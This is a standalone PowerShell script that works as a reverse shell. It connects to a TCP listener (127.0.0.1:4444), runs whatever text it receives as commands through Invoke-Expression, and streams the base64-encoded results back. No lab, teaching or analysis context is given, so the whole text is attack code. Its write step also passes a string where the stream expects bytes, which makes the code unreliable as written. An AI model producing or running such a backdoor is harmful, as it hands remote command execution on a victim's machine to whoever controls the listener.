$tcpClient = New-Object Net.Sockets.TCPClient("127.0.0.1", 4444)
$stream = $tcpClient.GetStream()
$bufferSize = 4096

while ($true) {
    $buffer = New-Object byte[] $bufferSize
    $bytesRead = $stream.Read($buffer, 0, $buffer.Length)

    if ($bytesRead -eq 0) {
        break
    }

    $receivedData = [Text.Encoding]::ASCII.GetString($buffer, 0, $bytesRead)

    # Check for null or empty data
    if (-not [string]::IsNullOrWhiteSpace($receivedData)) {
        $commandOutput = Invoke-Expression -Command $receivedData 2>&1

        # Handle non-text characters using Base64 encoding
        $encodedOutput = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($commandOutput))
        $stream.Write($encodedOutput, 0, $encodedOutput.Length)
    }

    # Clear the buffer
    $buffer = $null
}

$tcpClient.Close()
